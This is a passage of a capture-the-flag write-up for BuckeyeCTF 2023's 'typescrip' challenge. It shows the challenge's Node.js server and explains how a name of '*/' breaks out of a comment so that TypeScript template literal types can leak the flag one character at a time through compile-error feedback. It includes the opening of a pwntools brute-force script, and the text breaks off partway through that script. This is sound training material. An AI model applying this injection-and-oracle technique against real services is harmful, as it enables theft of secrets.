<!DOCTYPE html><!--jUDimr6wyOJvYNMJ2n6_v--><html class="dark scroll-smooth"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="https://user-images.githubusercontent.com/60120929/271787173-bec30743-e4d2-4446-9c53-ebac05d0bdb5.png"/><link rel="preload" as="image" href="https://user-images.githubusercontent.com/60120929/271787201-15c1a765-7c83-4eb0-b2de-f48a37f15e57.png"/><link rel="stylesheet" href="/_next/static/css/94afdc017676131d.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-d11e0b30904b49ad.js"/><script src="/_next/static/chunks/4bd1b696-9911af18dede28aa.js" async=""></script><script src="/_next/static/chunks/964-2bcac1827bbf29c7.js" async=""></script><script src="/_next/static/chunks/main-app-771e5b53791411ad.js" async=""></script><script src="/_next/static/chunks/874-3e820bd666038662.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js" async=""></script><script src="/_next/static/chunks/325-655a7b8ed93161e0.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/page-bcc47f65bcf2ff4c.js" async=""></script><meta name="next-size-adjust" content=""/><title>BuckeyeCTF 2023 — typescrip | kevin.fish</title><meta name="description" content="I like typescript. Do you like typescript?"/><meta property="og:title" content="BuckeyeCTF 2023 — typescrip"/><meta property="og:description" content="I like typescript. Do you like typescript?"/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BuckeyeCTF 2023 — typescrip"/><meta name="twitter:description" content="I like typescript. Do you like typescript?"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><div hidden=""><!--$--><!--/$--></div><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-4 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>BuckeyeCTF 2023 — typescrip</h1>
<blockquote>
<p>I like typescript. Do you like typescript?</p>
<p><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">nc chall.pwnoh.io 13381</code></p>
</blockquote>
<p>We&#x27;re given a JavaScript server that looks like this:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword module">import</span><span class=""> </span><span class="token imports punctuation">{</span><span class="token imports"> createServer </span><span class="token imports punctuation">}</span><span class=""> </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&quot;net&quot;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token keyword module">import</span><span class=""> </span><span class="token imports punctuation">{</span><span class="token imports"> </span><span class="token imports maybe-class-name">Project</span><span class="token imports"> </span><span class="token imports punctuation">}</span><span class=""> </span><span class="token keyword module">from</span><span class=""> </span><span class="token string">&quot;ts-morph&quot;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token keyword">const</span><span class=""> flag </span><span class="token operator">=</span><span class=""> process</span><span class="token punctuation">.</span><span class="token property-access">env</span><span class="token punctuation">.</span><span class="token constant">FLAG</span><span class=""> </span><span class="token operator">??</span><span class=""> </span><span class="token string">&quot;bctf{fake_flag}&quot;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class=""></span><span class="token keyword">function</span><span class=""> </span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token parameter">source</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">    </span><span class="token keyword">const</span><span class=""> project </span><span class="token operator">=</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">Project</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">useInMemoryFileSystem</span><span class="token operator">:</span><span class=""> </span><span class="token boolean">true</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">    </span><span class="token keyword">const</span><span class=""> sourceFile </span><span class="token operator">=</span><span class=""> project</span><span class="token punctuation">.</span><span class="token method function property-access">createSourceFile</span><span class="token punctuation">(</span><span class="token string">&quot;temp.ts&quot;</span><span class="token punctuation">,</span><span class=""> source</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">    </span><span class="token keyword">const</span><span class=""> diagnostics </span><span class="token operator">=</span><span class=""> sourceFile</span><span class="token punctuation">.</span><span class="token method function property-access">getPreEmitDiagnostics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> diagnostics</span><span class="token punctuation">.</span><span class="token method function property-access">map</span><span class="token punctuation">(</span><span class="token parameter">diagnostic</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">        </span><span class="token keyword">const</span><span class=""> severity </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">[</span><span class="token string">&quot;Warning&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;Error&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;Suggestion&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;Message&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="">diagnostic</span><span class="token punctuation">.</span><span class="token method function property-access">getCategory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">        </span><span class="token keyword control-flow">return</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">severity</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string"> on line </span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">diagnostic</span><span class="token template-string interpolation punctuation">.</span><span class="token template-string interpolation method function property-access">getLineNumber</span><span class="token template-string interpolation punctuation">(</span><span class="token template-string interpolation punctuation">)</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">    </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class=""></span><span class="token keyword">const</span><span class=""> server </span><span class="token operator">=</span><span class=""> </span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">    socket</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token string">&quot;What is your name?\n&gt; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">    socket</span><span class="token punctuation">.</span><span class="token method function property-access">once</span><span class="token punctuation">(</span><span class="token string">&quot;data&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token parameter">data</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">        </span><span class="token keyword">const</span><span class=""> name </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">.</span><span class="token method function property-access">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">        socket</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">Hello, </span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">name</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">. Give me some code: (end with blank line)\n&gt; </span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">        </span><span class="token keyword">let</span><span class=""> code </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">        </span><span class="token keyword">let</span><span class=""> done </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">false</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">        socket</span><span class="token punctuation">.</span><span class="token method function property-access">on</span><span class="token punctuation">(</span><span class="token string">&#x27;data&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token parameter">data</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">            </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">done</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword control-flow">return</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">            </span><span class="token keyword">const</span><span class=""> line </span><span class="token operator">=</span><span class=""> data</span><span class="token punctuation">.</span><span class="token method function property-access">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">            </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">line</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">                done </span><span class="token operator">=</span><span class=""> </span><span class="token boolean">true</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">                socket</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token string">&#x27;Thinking...\n&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">                </span><span class="token keyword">const</span><span class=""> today </span><span class="token operator">=</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">toLocaleDateString</span><span class="token punctuation">(</span><span class="token string">&#x27;en-us&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">                </span><span class="token keyword">const</span><span class=""> source </span><span class="token operator">=</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">/* TYPE CHECKED FOR </span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">name</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string"> ON </span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">today</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">. THE FLAG IS &quot;</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">flag</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">&quot;. */</span><span class="token template-string template-punctuation string">`</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token string">&quot;\n\n&quot;</span><span class=""> </span><span class="token operator">+</span><span class=""> code</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">                </span><span class="token keyword">const</span><span class=""> errors </span><span class="token operator">=</span><span class=""> </span><span class="token function">compile</span><span class="token punctuation">(</span><span class="">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">                </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">errors</span><span class="token punctuation">.</span><span class="token property-access">length</span><span class=""> </span><span class="token operator">===</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">                    socket</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token string">&#x27;Congrats, your code is perfect\n&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">                </span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword control-flow">else</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">                    socket</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="">errors</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="token string">&#x27;\n&#x27;</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token string">&#x27;\n&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">                </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">                socket</span><span class="token punctuation">.</span><span class="token method function property-access">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">            </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">            </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">done</span><span class="token punctuation">)</span><span class=""> socket</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token string">&#x27;&gt; &#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">45</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">            code </span><span class="token operator">+=</span><span class=""> line </span><span class="token operator">+</span><span class=""> </span><span class="token string">&#x27;\n&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">        </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">    </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">50</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">server</span><span class="token punctuation">.</span><span class="token method function property-access">listen</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></div>
<p>The server takes in a &quot;name&quot; and some code, then writes and type checks a TypeScript file resembling</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (ts)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token comment">/* TYPE CHECKED FOR {name} ON 9/29/2023. THE FLAG IS &quot;bctf{some_flag}&quot;. */</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token comment">// your code here</span></code></pre></div></div>
<p>reporting back any compilation errors. Note that we don&#x27;t get what the type errors <em>are</em>, just whether they exist (and how many there are, and their line numbers).</p>
<p>The main idea is that we can brute force the flag based on whether compilation errors exist in the code. We can break out of the block comment by setting our &quot;name&quot; to <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">*/</code>, and store the flag in a (multiline) string using backticks:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (ts)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token comment">/* TYPE CHECKED FOR */</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string string"> ON 9/29/2023. THE FLAG IS &quot;bctf{some_flag}&quot;. */
</span><span class="token template-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="token template-string string"></span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token keyword">function</span><span class=""> </span><span class="token function">foo</span><span class="token punctuation">(</span><span class="">x</span><span class="token operator">:</span><span class=""> </span><span class="token spread operator">...</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre></div></div>
<p>Then, type check this string by passing it into the argument to <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">foo()</code>. We can use <a href="https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html">template literal types</a> to match the flag one character at a time:</p>
<img width="541" alt="image" src="https://user-images.githubusercontent.com/60120929/271787173-bec30743-e4d2-4446-9c53-ebac05d0bdb5.png"/>
<img width="960" alt="image" src="https://user-images.githubusercontent.com/60120929/271787201-15c1a765-7c83-4eb0-b2de-f48a37f15e57.png"/>
<p>If the code compiles, we know the character is in the flag, and can keep looping over characters until none match.</p>
<p>Here&#x27;s a quick and inefficient script that does just that:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="text-xs rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (py)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">import</span><span class=""> pwn
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">flag </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">letters </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">[</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">    </span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;B&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;C&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;D&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;E&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;F&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;G&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;H&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;I&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;J&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;K&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;L&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;M&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;N&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;O&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;P&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;Q&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;R&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;S&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;T&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;U&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;V&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;W&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">    </span><span class="token string">&#x27;X&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;Y&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;Z&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">    </span><span class="token string">&#x27;a&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;b&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;c&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;d&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;e&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;f&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;g&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;h&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;i&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;j&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;k&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;l&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;m&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;n&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token 